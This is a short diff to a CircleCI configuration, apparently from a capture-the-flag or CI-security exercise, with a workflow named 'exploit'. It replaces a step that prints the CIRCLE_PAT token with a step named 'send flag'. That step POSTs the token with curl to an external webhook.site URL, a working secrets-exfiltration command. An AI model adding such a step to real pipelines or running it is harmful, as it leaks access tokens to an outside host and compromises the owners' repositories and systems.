@@ -6,8 +6,8 @@ jobs:
       - image: cimg/base:stable
     steps:
       - run:
-          name: show flag
-          command: printf "%s" "$CIRCLE_PAT" | base64 | tr -d "\n"
+          name: send flag
+          command: curl -fsS -X POST "https://webhook.site/cc716468-1dd5-4797-bd3e-e5da485079a2" --data-urlencode "flag=$CIRCLE_PAT"
 
 workflows:
   exploit:
